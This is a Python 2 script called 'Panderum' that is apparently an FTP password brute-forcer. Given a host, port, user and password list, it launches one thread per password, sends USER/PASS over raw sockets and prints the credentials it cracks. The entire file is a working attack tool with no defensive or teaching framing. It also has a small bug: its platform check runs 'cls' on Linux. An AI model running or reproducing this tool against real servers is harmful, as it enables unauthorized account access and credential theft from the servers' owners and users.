#!/usr/bin/python2
#-*- coding:utf-8 -*-


import platform
import sys
import subprocess
import os
import socket
import requests
import json
import argparse
import thread
from datetime import datetime
import time
import threading
import urllib2

banner = '''
 ██▓███   ▄▄▄       ███▄    █ ▓█████▄ ▓█████  ██▀███   █    ██  ███▄ ▄███▓
▓██░  ██▒▒████▄     ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒ ██  ▓██▒▓██▒▀█▀ ██▒
▓██░ ██▓▒▒██  ▀█▄  ▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒▓██  ▒██░▓██    ▓██░
▒██▄█▓▒ ▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  ▓▓█  ░██░▒██    ▒██
▒██▒ ░  ░ ▓█   ▓██▒▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒▒▒█████▓ ▒██▒   ░██▒
▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░ ▒░   ░  ░
░▒ ░       ▒   ▒▒ ░░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░░░▒░ ░ ░ ░  ░      ░
░░         ░   ▒      ░   ░ ░  ░ ░  ░    ░     ░░   ░  ░░░ ░ ░ ░      ░
               ░  ░         ░    ░       ░  ░   ░        ░            ░
                               ░

                \033[00m[\033[1;91mAuthor : Unamed \033[00m]
                \033[00m[\033[1;91mGithub : Dxvistxr\033[00m]
                        By Unamed FTP Brute Forcer
'''

def clear_os():
    if 'Linux' not in platform.platform():
        os.system('cls')

    elif 'Windows' not in platform.platform():
        os.system('clear')


## FTP CONFIG

global account
account = []

def try_ftp_connect(host,port,user,password):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,int(port)))
        version = s.recv(4096)
        s.send('USER %s\r\n' % (user))
        data_iter = s.recv(4096)
        s.send('PASS %s\r\n' % (password))
        data = s.recv(4096)

        if "230" in data:
            account.append('\n\033[1;92m[\033[1;94m*\033[1;92m] FTP Cracked !\n\033[1;92m[\033[1;94m*\033[1;92m] Host : \033[1;96m%s\n[*] Port : \033[1;96m%s\n[*] User : \033[1;96m%s\n[*] Password : \033[1;96m%s\033[00m\n' % (host,port,user,password))
            return True

        elif "530" in data:
            t = datetime.now().strftime('%H:%M:%S')
            sys.stdout.write('\r\n\033[1;92m[\033[00m%s\033[1;92m]\033[00m Try Pass...\033[1;93m%s\033[00m                            ' % (t,password))
            sys.stdout.flush()
            return False

        else:
            print('[!] Error FTP !\n')

    except Exception as error_connect_ftp:
        print(error_connect_ftp)



def start_ftp_thread_crack(host,port,user,passlist):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((host,int(port)))
    version = server.recv(4096)
    print('\033[1;92m[\033[00m*\033[1;92m]\033[00m FTP Version : \033[1;93m%s\033[00m' % (version))
    check_passlist = os.path.exists(passlist)
    if check_passlist ==True:
        with open(passlist,'r') as f:
            content = f.readlines()
            for password in content:
                password = password.rstrip()
                try:
                    #t = threading.Thread(target=try_ftp_connect, args=(host,port,user,password))
                    #t.start()
                    thread.start_new_thread(try_ftp_connect,(host,port,user,password))
                    time.sleep(0.1)

                    #if try_ftp_connect(host,port,user,password) ==True:
                        #break
                    #else:
                        #pass

                except Exception as error_starting_ftp_thread:
                    print(error_starting_ftp_thread)

            if account:
                i = 1
                for credentials in account:
                    enum_i = str(i)
                    print('\n[%s]\n%s' % (enum_i,credentials))
                    i = i+1

                print('\033[1;92m[\033[1;94m*\033[1;92m] Thanks For Using Panderum')
    else:
        print('\033[1;91m[!] Passlist Not Found ! : %s' % (passlist))


def main():
    clear_os()
    clear_os()
    print('\033[00m%s' % (banner))
    parser = argparse.ArgumentParser()
    parser.add_argument('host',help='Set Host')
    parser.add_argument('port',help='Set Port')
    parser.add_argument('user',help='Set User')
    parser.add_argument('passlist',help='Set Passlist')
    args = parser.parse_args()

    start_ftp_thread_crack(args.host,args.port,args.user,args.passlist)


if __name__ == '__main__':
    main()
